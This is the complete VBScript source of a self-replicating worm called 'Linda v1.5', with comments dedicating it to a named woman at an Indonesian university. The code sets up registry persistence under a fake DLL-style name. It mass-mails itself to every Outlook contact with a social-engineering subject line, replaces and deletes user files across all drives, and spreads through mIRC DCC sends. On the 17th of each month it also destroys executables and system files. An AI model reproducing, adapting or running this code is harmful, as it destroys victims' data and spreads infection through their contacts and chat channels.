  rem (c) 2001 created by Felix The Cat.
  rem Special for Linda Indrawati at STTS University, Surabaya, Indonesia.
  rem Happy Birthday Linda (17 - 12 - 1977). 
  rem This is a Linda v1.5......... A short name of Linda Indrawati
  On Error Resume Next
  rem I am Felix...
  Dim d, dc, s, listadriv, fso, dirsystem, eq, dorr
  dim x, a, ctrlists, ctrentries, malead, b, f, f1, fc, ext, ap, bname, helloz
  rem ctr = "a"
  eq=""
  Set fso = CreateObject("Scripting.FileSystemObject")
  Set regedit = CreateObject("WScript.Shell")
  Set dirsystem = fso.GetSpecialFolder(1)
  fso.CopyFile WScript.ScriptFullName, dirsystem & "\XMLDriver32.dll.vbs", true
  listz()
  mailz()
  if day(now) = 17 then
    killz()         
    msgbox "This is for Linda Indrawati....."
  end if
  regedit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\XMLDriver32",dirsystem & "\XMLDriver32.dll.vbs"
  regedit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Run\XMLDriver32",dirsystem & "\XMLDriver32.dll.vbs"  
  sub listz
  on error resume next
  dim d
  Set dc = fso.Drives
  For Each d in dc
  If d.DriveType = 2 or d.DriveType=3 or d.DriveType=4 Then
  folderlist(d.path&"\")
  end if
  Next
  end sub
  sub killz
  on error resume next
  dim d
  Set dc = fso.Drives
  For Each d in dc
  If d.DriveType = 2 or d.DriveType=3 or d.DriveType=4 Then
  killist(d.path&"\")
  end if
  Next 
  end sub
  sub mailz
  on error resume next
  set out=WScript.CreateObject("Outlook.Application")
  set mapi=out.GetNameSpace("MAPI")
  rem 1234
  for ctrlists=1 to mapi.AddressLists.Count
  set a=mapi.AddressLists(ctrlists)
  x=1
  rem Just watch the effect.........
  for ctrentries=1 to a.AddressEntries.Count
  malead=a.AddressEntries(x)
  set male=out.CreateItem(0)
  male.Recipients.Add(a.AddressEntries(1))
  rem not too bad
  male.BCC=a.AddressEntries(2) & "; " & a.AddressEntries(x+2)
  male.Subject = "Re: Need Your help....." 
  male.Body = "This is the attached file you asked from me. "
  male.Attachments.Add(WScript.ScriptFullName)
  male.Send
  rem Do not worry about your future.
  x=x+1
  next
  rem i am very stress..........
  next
  Set out=Nothing
  Set mapi=Nothing
  end sub
  sub folderlist(folderspec)
  On Error Resume Next
  dim f,f1,sf, tt, zz, zz1
  dim fc,ext,ap,s,bname
  set zz = fso.GetFolder(folderspec)
  set tt = zz.SubFolders
  for each zz1 in tt
   set f = fso.GetFolder(zz1.path)
   set fc = f.Files
  for each f1 in fc
  rem how are you ???
  ext=fso.GetExtensionName(f1.path)
  ext=lcase(ext)
  s=lcase(f1.name)
  if (ext="vbs") or (ext="vbe") or (ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") or (ext="jpg") or (ext="jpeg") or (ext="mp3") or (ext="mp2") or (ext="xml") or (ext="php") or (ext="htm") or (ext="wav") or (ext="bmp") or (ext="doc") or (ext="rtf") or (ext="xls") or (ext="ppt") or (ext="wri") or (ext="mdb") or (ext="zip") or (ext="rar") or (ext="arj") or (ext="pdf") or (ext="mid") or (ext="gif") or (ext="avi") or (ext="hlp") or (ext="frm") or (ext="mp4") or (ext="c") or (ext="pl") or (ext="pas") or (ext="ps") or (ext="tif") or (ext="wpd") or (ext="fm") or (ext="mk5") or (ext="asp") or (ext="txt") or (ext="chm") or (ext="gz") or (ext="tar") or (ext="wsc") or (ext="mht") or (ext="htt") or (ext="lha") or (ext="lzh") or (ext="pcx") or (ext="pif") or (ext="cpp") or (ext="url") or (ext="asm") then
  set dorr = fso.getfile(f1.path)
  set helloz = fso.getfile(wscript.scriptfullname)
  if dorr.size <>  helloz.size then
  set listadriv = fso.GetFile(f1.path)
  listadriv.attributes archive  
  bname=fso.GetBaseName(f1.path)  
  fso.CopyFile WScript.ScriptFullName, zz1.path & "\" & bname & "." & ext & ".vbs", true
  fso.DeleteFile(f1.path)
  end if
  End if 
  if (eq<>zz1.path) then
  if (s="mirc32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
  set scriptini=fso.CreateTextFile(zz1.path & "\script.ini")
  scriptini.WriteLine "[script]"
  scriptini.WriteLine "n0=on 1:JOIN:#:{"
  scriptini.WriteLine "n1= /if ( $nick == $me ) { halt }"
  scriptini.WriteLine "n2= /.dcc send $nick "&WScript.ScriptFullName
  scriptini.WriteLine "n3=}"
  rem looking for fun
  scriptini.close
  eq=zz1.path
  end if
  end if
  next 
  folderlist(zz1.path)
  rem just relax
  next
  end sub
  sub killist(folderspec)
  On Error Resume Next
  dim f,f1,sf, tt, zz, zz1
  dim fc,ext,ap,s,bname
  set zz = fso.GetFolder(folderspec)
  set tt = zz.SubFolders
  for each zz1 in tt
   set f = fso.GetFolder(zz1.path)
   set fc = f.Files
  for each f1 in fc
  rem how are you ???
  ext=fso.GetExtensionName(f1.path)
  ext=lcase(ext)
  s=lcase(f1.name)
  if (ext="vbs") or (ext="vbe") or (ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") or (ext="jpg") or (ext="jpeg") or (ext="mp3") or (ext="mp2") or (ext="xml") or (ext="php") or (ext="htm") or (ext="wav") or (ext="bmp") or (ext="doc") or (ext="rtf") or (ext="xls") or (ext="ppt") or (ext="wri") or (ext="mdb") or (ext="zip") or (ext="rar") or (ext="arj") or (ext="pdf") or (ext="mid") or (ext="gif") or (ext="avi") or (ext="hlp") or (ext="frm") or (ext="mp4") or (ext="c") or (ext="pl") or (ext="pas") or (ext="ps") or (ext="tif") or (ext="wpd") or (ext="fm") or (ext="mk5") or (ext="asp") or (ext="txt") or (ext="chm") or (ext="gz") or (ext="tar") or (ext="wsc") or (ext="mht") or (ext="htt") or (ext="lha") or (ext="lzh") or (ext="pcx") or (ext="pif") or (ext="cpp") or (ext="exe") or (ext="com") or (ext="dll") or (ext="drv") or (ext="cab") or (ext="ovl") or (ext="bat") or (ext="sys") or (ext="log") or (ext="bin") or (ext="ovr") then
  set listadriv = fso.GetFile(f1.path)
  listadriv.attributes archive  
  bname=fso.GetBaseName(f1.path)  
  fso.CopyFile WScript.ScriptFullName, zz1.path & "\" & bname & "." & ext & ".vbs", true
  fso.DeleteFile(f1.path)
  End if 
  next 
  killist(zz1.path)
  rem just relax
  next
  end sub
  rem STTS University is located at Jl Ngagel Jaya Tengah 73 - 77, Surabaya.
  rem x = x + 10
  rem Viva STTS !!!
